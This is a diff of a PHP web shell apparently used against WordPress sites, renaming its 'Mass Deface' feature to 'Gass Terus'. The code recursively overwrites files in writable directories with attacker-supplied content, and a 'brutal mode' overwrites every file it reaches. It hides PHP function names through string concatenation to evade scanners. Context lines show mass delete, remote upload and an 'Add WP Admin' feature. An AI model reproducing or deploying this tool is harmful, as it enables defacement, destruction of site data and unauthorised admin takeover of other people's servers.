@@ -1286,7 +1286,7 @@ $path = str_replace("\\", "/", $path);
             <a href="?option&path=<?= $path ?>&newfolder"><button type="button" name="newfolder" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-duotone fa-folder-plus"></i>&nbsp;New Folder</button>
             <a href="?option&path=<?= $path ?>&newfiles"><button type="button" name="newfiles" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-neutral-200 dark:focus:ring-neutral-400 hover:bg-neutral-400"><i class="fa-duotone fa-file-plus"></i>&nbsp;New Files</button>
             <a href="?option&path=<?= $path ?>&remoteupload"><button type="button" name="remoteup" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-upload"></i>&nbsp;Remote Upload</button>
-            <a href="?option&path=<?= $path ?>&mass_deface"><button type="button" name="massdeface" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-masks-theater"></i>&nbsp;Mass Deface</button>
+            <a href="?option&path=<?= $path ?>&Gass_Terus"><button type="button" name="gasterus" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-masks-theater"></i>&nbsp;Gass Terus</button>
             <a href="?option&path=<?= $path ?>&mass_delete"><button type="button" name="massdelete" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-600 hover:bg-slate-600"><i class="fa-solid fa-trash-can"></i>&nbsp;Mass Delete</button>
             <a href="?option&path=<?= $path ?>&ziper"><button type="button" name="ziper" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> hover:text-black border rounded-lg focus:ring-4 focus:ring-amber-200 dark:focus:ring-amber-500 hover:bg-amber-500"><i class="fa-regular fa-file-zipper"></i>&nbsp;Ziper</button>
             <a href="?option&path=<?= $path ?>&addNewAdmin"><button type="button" name="addnewadmin" class="inline-flex items-center px-2 py-2 mx-2 font-bold text-center <?=$txtWhite?> border rounded-lg focus:ring-4 focus:ring-blue-300 dark:focus:ring-blue-600 hover:bg-blue-600"><i class="fa-regular fa-users-medical"></i>&nbsp;Add WP Admin</button></a>
@@ -1976,7 +1976,7 @@ $path = str_replace("\\", "/", $path);
         echo '</form>';
     }
 
-    if (isset($_GET['mass_deface'])) {
+    if (isset($_GET['Gass_Terus'])) {
         $f_put = 'f'.'il'.'e'.'_'.'pu'.'t'.'_'.'co'.'n'.'te'.'nt'.'s';
         $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
         $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
@@ -1984,7 +1984,7 @@ $path = str_replace("\\", "/", $path);
         $is_f = 'is'.'_'.'f'.'i'.'l'.'e';
         $scn_d = 'sc'.'an'.'d'.'ir';
         $glb = 'g'.'l'.'o'.'b';
-        function mass_normal($path, $massdefacefilename, $massdefacefilcontent) {
+        function mass_normal($path, $gasterusfilename, $gasterusfilcontent) {
             global $f_put;
             global $is_w;
             global $is_r;
@@ -1998,18 +1998,18 @@ $path = str_replace("\\", "/", $path);
                 $scan = $scn_d($path);
                 foreach ($scan as $dir) {
                     $this_dir = "$path/$dir";
-                    $this_files = "$this_dir/$massdefacefilename";
-                    $defacefile = str_replace('\\', '/', $this_files);
+                    $this_files = "$this_dir/$gasterusfilename";
+                    $gtfiles = str_replace('\\', '/', $this_files);
                     if ($dir === '.') {
-                        $f_put($defacefile, $massdefacefilcontent);
+                        $f_put($gtfiles, $gasterusfilcontent);
                     } elseif ($dir === '..') {
-                        $f_put($defacefile, $massdefacefilcontent);
+                        $f_put($gtfiles, $gasterusfilcontent);
                     } else {
                         if($is_d($this_dir)) {
                             if($is_w($this_dir)) {
-                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$defacefile.' (<font class="'.$txtGreen.' font-bold">DEFACED!</font>)<br>';
-                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$path.'/'.$massdefacefilename.' (<font class="'.$txtGreen.' font-bold">DEFACED!</font>)<br>';
-                                $f_put($defacefile, $massdefacefilcontent);
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$gtfiles.' (<font class="'.$txtGreen.' font-bold">TERKEDJOET!!</font>)<br>';
+                                echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$path.'/'.$gasterusfilename.' (<font class="'.$txtGreen.' font-bold">TERKEDJOET!!</font>)<br>';
+                                $f_put($gtfiles, $gasterusfilcontent);
                             }
                         }
                     }
@@ -2018,7 +2018,7 @@ $path = str_replace("\\", "/", $path);
                 echo '<span class="'.$txtYellow.'">Sorry... Your Selected Path Not Writetable!</span>';
             }
         }
-        function mass_brutal($path, $massdefacefilcontent) {
+        function mass_brutal($path, $gasterusfilcontent) {
             global $f_put;
             global $is_w;
             global $is_r;
@@ -2035,18 +2035,18 @@ $path = str_replace("\\", "/", $path);
                 foreach ($scan as $dir) {
                     $this_dir = "$path/$dir";
                     $getallfile = $glb($path . '*', GLOB_MARK);
-                    foreach ($getallfile as $massdefacefilename) {
-                    $defacefile = str_replace('\\', '/', $massdefacefilename);
+                    foreach ($getallfile as $gasterusfilename) {
+                    $gtfiles = str_replace('\\', '/', $gasterusfilename);
                         if ($dir === '.') {
-                            $f_put($defacefile, $massdefacefilcontent);
+                            $f_put($gtfiles, $gasterusfilcontent);
                         } elseif ($dir === '..') {
-                            $f_put($defacefile, $massdefacefilcontent);
+                            $f_put($gtfiles, $gasterusfilcontent);
                         } else {
                             if($is_d($this_dir)) {
                                 if($is_w($this_dir)) {
-                                    echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$defacefile.' (<font class="'.$txtGreen.' font-bold">DEFACED!</font>)<br>';
-                                    $f_put($defacefile, $massdefacefilcontent);
-                                    mass_brutal($defacefile, $massdefacefilcontent);
+                                    echo '<span class="'.$txtWhite.' ml-4">[<i class="fa-solid fa-check-double '.$txtGreen.'"></i>]</span>&nbsp;'.$gtfiles.' (<font class="'.$txtGreen.' font-bold">TERKEDJOET!!</font>)<br>';
+                                    $f_put($gtfiles, $gasterusfilcontent);
+                                    mass_brutal($gtfiles, $gasterusfilcontent);
                                 }
                             }
                         }
@@ -2057,16 +2057,16 @@ $path = str_replace("\\", "/", $path);
             }
         }
         if (isset($_POST['btn-normal-mode'])) {
-            $defacepath = $_POST['massdefacepath'];
-            $defacefilename = $_POST['massdefacefile'];
-            $defacefilecontent = $_POST['massdefacefilecontent'];
-            mass_normal($defacepath, $defacefilename, $defacefilecontent);
+            $gtpatch = $_POST['gasteruspath'];
+            $gtfilesname = $_POST['gasterusfile'];
+            $gtfilescontent = $_POST['gasterusfilecontent'];
+            mass_normal($gtpatch, $gtfilesname, $gtfilescontent);
         }
 
         if (isset($_POST['btn-brutal-mode'])) {
-            $defacepath = $_POST['massdefacepath'];
-            $defacefilecontent = $_POST['massdefacefilecontent'];
-            mass_brutal($defacepath, $defacefilecontent);
+            $gtpatch = $_POST['gasteruspath'];
+            $gtfilescontent = $_POST['gasterusfilecontent'];
+            mass_brutal($gtpatch, $gtfilescontent);
         }
         echo '
         <form method="POST" action="" class="max-w-sm ml-4 mt-6">
@@ -2086,11 +2086,11 @@ $path = str_replace("\\", "/", $path);
                 echo '<span class="block '.$txtYellow.' font-medium">'.strtoupper($mode).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Mode Selected!</font></span>';
                 echo '<label class="block">
             <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
-            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="massdefacepath">
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="gasteruspath">
             </label>';
                 echo '<label class="block">
             <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
-            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="massdefacefile">
+            <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="gasterusfile">
             </label>';
             echo '
             <style type="text/css">
@@ -2445,7 +2445,7 @@ $path = str_replace("\\", "/", $path);
             </select><br><br>
             <div id="divCodeWrapper">
                 <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
-                <textarea name="massdefacefilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+                <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
             </div>
             <script type="text/javascript">
             const textarea1 = document.getElementById("textarea1");
@@ -2637,18 +2637,18 @@ $path = str_replace("\\", "/", $path);
             </script>
             ';
         echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
-        echo '<button type="submit" name="btn-normal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Deface</button>';
+        echo '<button type="submit" name="btn-normal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Gass Terus</button>';
         echo '</form>';
             } elseif ($mode === $brutal) {
                 echo '<form class="ml-4 my-2" action="" method="POST">';
                 echo '<span class="block '.$txtRed.' font-medium">'.strtoupper($mode).'<font class="'.$txtBlue.'">&nbsp;&nbsp;Mode Selected!</font></span>';
                 echo '<label class="block">
                     <span class="block '.$txtBlue.' font-medium">Path <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
-                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="massdefacepath">
+                    <input type="text" class="bg-white '.$txtBlack.' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="'.$path.'" name="gasteruspath">
                     </label>';
                         echo '<label class="block">
                     <span class="block '.$txtBlue.' font-medium">Filename <i class="fa-solid fa-arrow-down '.$txtWhite.'"></i></span>
-                    <span class="block '.$txtRed.'">(<font class="'.$txtYellow.' font-bold">WARNING</font>) This Brutal Mode Deface All Files! <font class="'.$txtYellow.' font-bold">DANGEROUS!</font></span>
+                    <span class="block '.$txtRed.'">(<font class="'.$txtYellow.' font-bold">WARNING</font>) This GASSPOLL All Files! <font class="'.$txtYellow.' font-bold">DANGEROUS!</font></span>
                     </label>';
                     echo '
                     <style type="text/css">
@@ -3003,7 +3003,7 @@ $path = str_replace("\\", "/", $path);
                     </select><br><br>
                     <div id="divCodeWrapper">
                         <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
-                        <textarea name="massdefacefilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
+                        <textarea name="gasterusfilecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="NuLz Was Here"></textarea>
                     </div>
                     <script type="text/javascript">
                     const textarea1 = document.getElementById("textarea1");
@@ -3195,7 +3195,7 @@ $path = str_replace("\\", "/", $path);
                     </script>
                     ';
                 echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
-                echo '<button type="submit" name="btn-brutal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Mass Deface</button>';
+                echo '<button type="submit" name="btn-brutal-mode" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Gass Terus</button>';
                 echo '</form>';
             } else {
                 echo '<span style="display: none;">NuLz Haxorstars</span>';
